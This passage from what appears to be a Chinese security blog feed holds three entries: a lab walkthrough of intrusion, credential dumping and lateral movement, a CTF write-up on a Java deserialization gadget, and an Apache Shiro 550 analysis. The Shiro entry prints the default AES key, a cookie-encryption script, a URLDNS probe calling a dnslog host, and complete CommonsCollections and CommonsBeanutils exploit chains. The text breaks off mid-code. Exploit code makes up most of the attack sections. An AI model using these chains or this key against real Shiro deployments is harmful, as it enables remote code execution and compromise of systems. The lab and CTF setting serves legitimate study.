      <url>/2024/11/11/2024-09-28-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/</url>
      
        <content type="html"><![CDATA[<p>TP框架，工具扫。直接上shell。命令执行存在两个网段</p><p>CS上线。CS插件MS15-015进行提权。</p><p>端口445，扫描138网段探测存活</p><p><img src="/%5Cimages%5Cposts%5C%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5%5Cimage-20240928112913617.png"></p><p>探测两台主机存活</p><p><img src="/%5Cimages%5Cposts%5C%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5%5Cimage-20240928113016542.png"></p><p>system权限抓取密码</p><p><img src="/%5Cimages%5Cposts%5C%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5%5Cimage-20240928113037927.png"></p><p>这里抓取到了域管理员administrator的密码。域控主机多半不出网的.</p><p>445端口存活，PsExec上线</p><p>新增监听器</p><p><img src="/%5Cimages%5Cposts%5C%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5%5Cimage-20240928152032621.png"></p><p><img src="/%5Cimages%5Cposts%5C%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5%5Cimage-20240928152235560.png"></p><p>成功上线</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>东华杯ezgadgetJava反序列化</title>
      <link href="/2024/11/11/2024-09-27-%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/11/11/2024-09-27-%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目是一个jar包</p><p>其中<code>ToStringBean</code>类下调用了defineclass和newInstance方法.跟之前的CC3一样造成任意代码执行</p><p><img src="/%5Cimages%5Cposts%5C%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5Cimage-20240927201628256.png"></p><p>而在之前的CC5中<code>BadAttributeValueExpException</code>调用了<code>toString</code>方法</p><p><img src="/%5Cimages%5Cposts%5C%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5Cimage-20240927202653895.png"></p><p>所以链子为<code>BadAttributeValueExpException</code>-&gt;<code>toString</code></p><h1 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h1><p>先通过反射修改<code>ClassByte</code>的值</p><pre class="language-Java" data-language="Java"><code class="language-Java">ToStringBean toStringBean &#x3D; new ToStringBean();Field declaredField &#x3D; toStringBean.getClass().getDeclaredField(&quot;ClassByte&quot;);declaredField.setAccessible(true);byte[] bytes &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));declaredField.set(toStringBean,bytes);</code></pre><p>再用<code>BadAttributeValueExpException</code>来调用<code>toString</code></p><p><img src="/%5Cimages%5Cposts%5C%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5Cimage-20240927203732634.png"></p><p>这里是调用<code>toString</code>后将结果赋值给了val,然后<code>readObject</code>调用val的<code>toString</code>.所以这里随便传一个值在后面在反射修改回来</p><pre class="language-Java" data-language="Java"><code class="language-Java">BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(113);&#x2F;&#x2F;随便传Field declaredField1 &#x3D; badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);declaredField1.setAccessible(true);declaredField1.set(badAttributeValueExpException,toStringBean);</code></pre><p><code>IndexController</code>里面的if判断</p><pre class="language-none"><code class="language-none">if (name.equals(&quot;gadgets&quot;) &amp;&amp; year &#x3D;&#x3D; 2021) &#123;    objectInputStream.readObject();&#125;</code></pre><p>所以最后的EXP为</p><pre class="language-Java" data-language="Java"><code class="language-Java">package com.ezgame.ctf.tools;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class EXP &#123;    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException &#123;        ToStringBean toStringBean &#x3D; new ToStringBean();        Field declaredField &#x3D; toStringBean.getClass().getDeclaredField(&quot;ClassByte&quot;);        declaredField.setAccessible(true);        byte[] bytes &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));        declaredField.set(toStringBean, bytes);        BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(113);&#x2F;&#x2F;随便传        Field declaredField1 &#x3D; badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);        declaredField1.setAccessible(true);        declaredField1.set(badAttributeValueExpException, toStringBean);        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeUTF(&quot;gadgets&quot;);        objectOutputStream.writeInt(2021);        objectOutputStream.writeObject(badAttributeValueExpException);        byte[] byteArray &#x3D; byteArrayOutputStream.toByteArray();        String bytes1 &#x3D; Tools.base64Encode(byteArray);        System.out.println(bytes1);    &#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro550,CB2</title>
      <link href="/2024/11/11/2024-09-27-Shiro550,CB2/"/>
      <url>/2024/11/11/2024-09-27-Shiro550,CB2/</url>
      
        <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>Shiro Cookie的<code>RememberMe</code>字段存在反序列化.全局搜索Cookie找到<code>CookieRememberMeManager</code>.根据名字猜测与<code>RememberMe</code>有关</p><p>根据名字.<code>rememberSerializedIdentity</code>是序列化<code>RememberMe</code>,<code>getRememberedSerializedIdentity</code>是将序列化的内容读出来</p><p>判断是不是http请求,是的话就获取到<code>request</code>和<code>response</code>,在获取cookie,如果不为null,就返回base64解码结果</p><p>查找调用<code>getRememberedSerializedIdentity</code>,找到了<code>AbstractRememberMeManager</code>下的<code>getRememberedPrincipals</code>方法</p><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240926222115449.png"></p><p>获取到了反序列化的内容保存到<code>bytes</code>中给了<code>convertBytesToPrincipals</code>方法.查看<code>convertBytesToPrincipals</code>方法</p><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240926222628798.png"></p><p><code>decrypt</code>解密,<code>deserialize</code>反序列化</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>跟进<code>decrypt</code>方法</p><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240926222844496.png"></p><p><code>getCipherService</code>获取密钥服务保存到<code>cipherService</code>,如果不为null,在进行<code>decrypt</code>解密在返回</p><p>在看一下<code>decrypt</code>,是一个接口.一个参数是加密数组,一个是key.key是<code>getDecryptionCipherKey</code>方法获取的,跟进查看是返回一个常量<code>decryptionCipherKey</code>.然后就查找用法,在<code>AbstractRememberMeManager</code>下的<code>setDecryptionCipherKey</code>方法赋值</p><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240926223515094.png"></p><p>又查找谁调用了这个方法,又找到了同一类下的<code>setCipherKey</code></p><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240926223713197.png"></p><p>继续查找调用.<code>AbstractRememberMeManager</code>调用了<code>setCipherKey</code>,<code>setCipherKey</code>里面的参数<code>DEFAULT_CIPHER_KEY_BYTES</code>是一个定值</p><pre class="language-none"><code class="language-none">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</code></pre><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240926223859185.png"></p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>回到之前,跟进<code>deserialize</code>在跟进里面的<code>deserialize</code>方法,最后Shiro包里面<code>deserialize</code>调用了<code>readObject</code>方法</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>登录的时候勾选Remember Me</p><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240926235859371.png"></p><p>加密脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime <span class="token keyword">import</span> base<span class="token keyword">from</span> pydoc <span class="token keyword">import</span> plain<span class="token keyword">import</span> sys<span class="token keyword">import</span> base64<span class="token keyword">from</span> turtle <span class="token keyword">import</span> mode<span class="token keyword">import</span> uuid<span class="token keyword">from</span> random <span class="token keyword">import</span> Random<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">def</span> <span class="token function">get_file_data</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> data<span class="token keyword">def</span> <span class="token function">aes_enc</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size    pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> <span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span>    mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span>    encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    ciphertext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ciphertext<span class="token keyword">def</span> <span class="token function">aes_dec</span><span class="token punctuation">(</span>enc_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    enc_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc_data<span class="token punctuation">)</span>    unpad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>s<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> <span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span>    mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC    iv <span class="token operator">=</span> enc_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>    encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    plaintext <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc_data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    plaintext <span class="token operator">=</span> unpad<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>    <span class="token keyword">return</span> plaintext<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> get_file_data<span class="token punctuation">(</span><span class="token string">"CCTest1.ser"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>aes_enc<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="UrlDns探测"><a href="#UrlDns探测" class="headerlink" title="UrlDns探测"></a>UrlDns探测</h2><p>抓包先把前面的JSESSIONID给删了，然后直接把之前的DNS链生成序列化文件，用脚本加密后替换rememberMe就可以收到请求</p><pre class="language-Java" data-language="Java"><code class="language-Java">package org.example;import java.io.*;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class UrlDns &#123;    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;        HashMap&lt;URL, Object&gt; hashMap &#x3D; new HashMap&lt;URL, Object&gt;();        URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;jiqimer.142dwl.dnslog.cn&quot;);        &#x2F;&#x2F;todo 这里就把hashCode变成了url的hashCode,hashCode默认是-1，这里发起请求后url就不是-1了所以反序列化不能发起请求        &#x2F;&#x2F;todo 要在反序列话的时候才触发，所以这里不能发起请求且不能变成-1        Class c &#x3D; url.getClass();        Field hashCodefield &#x3D; c.getDeclaredField(&quot;hashCode&quot;);        hashCodefield.setAccessible(true);        hashCodefield.set(url, 12);        hashMap.put(url, &quot;12313&quot;);        hashCodefield.set(url, -1);        serialize(hashMap);&#x2F;&#x2F;        unserialize(&quot;CCTest1.ser&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;CCTest1.ser&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h3><p>Shiro不支持数组类.而且Shiro也不自带Commons-Collections 4.0的依赖.所以就拼凑一下链子</p><p>这里拼凑了CC3、CC2和CC6</p><pre class="language-Java" data-language="Java"><code class="language-Java">package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class CC3_2_6 &#123;    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;        &#x2F;&#x2F;CC3        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class c &#x3D; templates.getClass();        Field nameField &#x3D; c.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;admin&quot;);        Field bytecodeField &#x3D; c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));        byte[][] codes &#x3D; &#123;code&#125;;        bytecodeField.set(templates,codes);        &#x2F;&#x2F;CC2        InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);        &#x2F;&#x2F;CC6        HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();        Map&lt;Object,Object&gt; layzMap &#x3D; LazyMap.decorate(map, new ConstantTransformer(1));        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(layzMap, templates);        HashMap&lt;Object,Object&gt; hashMap &#x3D; new  HashMap&lt;&gt;();        hashMap.put(tiedMapEntry,&quot;admin&quot;);        layzMap.remove(templates);        Class&lt;LazyMap&gt; lazyMapClass &#x3D; LazyMap.class;        Field factoryField &#x3D; lazyMapClass.getDeclaredField(&quot;factory&quot;);        factoryField.setAccessible(true);        factoryField.set(layzMap,invokerTransformer);        serialize(hashMap);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;CCTest1.txt&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    &#125;&#125;</code></pre><p>脚本加密后弹出计算器</p><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240927103913220.png"></p><h3 id="CB1"><a href="#CB1" class="headerlink" title="CB1"></a>CB1</h3><p>用之前的payload打如果报错</p><pre class="language-none"><code class="language-none">Caused by: java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID &#x3D; -2044202215314119608, local class serialVersionUID &#x3D; -3490850999041592962</code></pre><p>反序列化流的serialVersionUID和本地类的serialVersionUID不同.</p><blockquote><p>serialVersionUID:</p><p>两个不同版本的类库可能又同一个类，而这两个类可能有一些方法和属性发生变化，序列化的时候可能因为不兼容导致隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的serialVersionUID 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的serialVersionUID 不同，则反序列化就会异常退出，避免后续的未知隐患。</p></blockquote><p>war包里面的commons-beanutils是1.8.3版本的</p><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240927110452245.png"></p><p>将我们本地的commons-beanutils也换成1.8.3就可以</p><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240927110520218.png"></p><pre class="language-Java" data-language="Java"><code class="language-Java">package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.beanutils.BeanComparator;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CB &#123;    public static void main(String[] args) throws IllegalAccessException, IOException, NoSuchFieldException, TransformerConfigurationException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException &#123;        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class c &#x3D; templates.getClass();        Field nameField &#x3D; c.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;admin&quot;);        Field bytecodeField &#x3D; c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));        byte[][] codes &#x3D; &#123;code&#125;;        bytecodeField.set(templates,codes);&#x2F;&#x2F;&#x2F;&#x2F;        Field tfactoryField &#x3D; c.getDeclaredField(&quot;_tfactory&quot;);&#x2F;&#x2F;        tfactoryField.setAccessible(true);&#x2F;&#x2F;        tfactoryField.set(templates, new TransformerFactoryImpl());&#x2F;&#x2F;        templates.newTransformer();&#x2F;&#x2F;        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);        BeanComparator comparator &#x3D; new BeanComparator();        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(comparator);        priorityQueue.add(1);        priorityQueue.add(2);        Class priorityQueueClass &#x3D; priorityQueue.getClass();        Field declaredField &#x3D; priorityQueueClass.getDeclaredField(&quot;queue&quot;);        declaredField.setAccessible(true);        declaredField.set(priorityQueue,new Object[]&#123;templates,templates&#125;);        Class comparatorClass &#x3D; comparator.getClass();        Field declaredField1 &#x3D; comparatorClass.getDeclaredField(&quot;property&quot;);        declaredField1.setAccessible(true);        declaredField1.set(comparator,&quot;outputProperties&quot;);        serialize(priorityQueue);        unserialize(&quot;CCTest1.txt&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;CCTest1.txt&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    &#125;&#125;</code></pre><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240927110611084.png"></p><h3 id="CB2"><a href="#CB2" class="headerlink" title="CB2"></a>CB2</h3><p>如果报错没找到 org.apache.commons.collections.comparators.ComparableComparator 类</p><p>原因是正常使用 Shiro 的时候不需要依赖于 commons-collections，但反序列化利用的时候需要依赖于commons-collections</p><p>![](\images\posts\Shiro550\image-20240927113339256.png</p><p>如果不传参就会默认调用<code>ComparableComparator</code>.ComparableComparator类存在于commons-collections包中.</p><p>跟进<code>ComparableComparator</code></p><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240927113716533.png" alt="image-20240927113716533"></p><p>所以要替换<code>ComparableComparator</code>就要满足</p><blockquote><p>实现java.util.Comparator 接口</p><p>实现java.io.Serializable 接口</p><p>Java、shiro或commons-beanutils自带</p></blockquote><p>查找实现类,找到了java.lang.String的<code>CaseInsensitiveComparator</code></p><p><img src="/%5Cimages%5Cposts%5CShiro550%5Cimage-20240927113940229.png"></p><pre class="language-none"><code class="language-none">CASE_INSENSITIVE_ORDER &#x3D; new CaseInsensitiveComparator()</code></pre><p>所以<code>BeanComparator</code>里面传入<code>String.CASE_INSENSITIVE_ORDER</code></p><pre class="language-none"><code class="language-none">BeanComparator comparator &#x3D; new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);</code></pre><p>然后把下面的<code>priorityQueue.add</code>改成字符串类型</p><pre class="language-none"><code class="language-none">priorityQueue.add(&quot;1&quot;);priorityQueue.add(&quot;2&quot;);</code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">BeanComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">TransformerConfigurationException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CB2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span>  <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> c <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> nameField <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> bytecodeField <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bytecodeField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"D:\\桌面\\note\\ClassLoaderTest.class\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        bytecodeField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span>codes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token comment">//        Field tfactoryField = c.getDeclaredField("_tfactory");</span><span class="token comment">//        tfactoryField.setAccessible(true);</span><span class="token comment">//        tfactoryField.set(templates, new TransformerFactoryImpl());</span><span class="token comment">//        templates.newTransformer();</span><span class="token comment">//        PropertyUtils.getProperty(templates,"outputProperties");</span>        <span class="token class-name">BeanComparator</span> comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE_ORDER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token 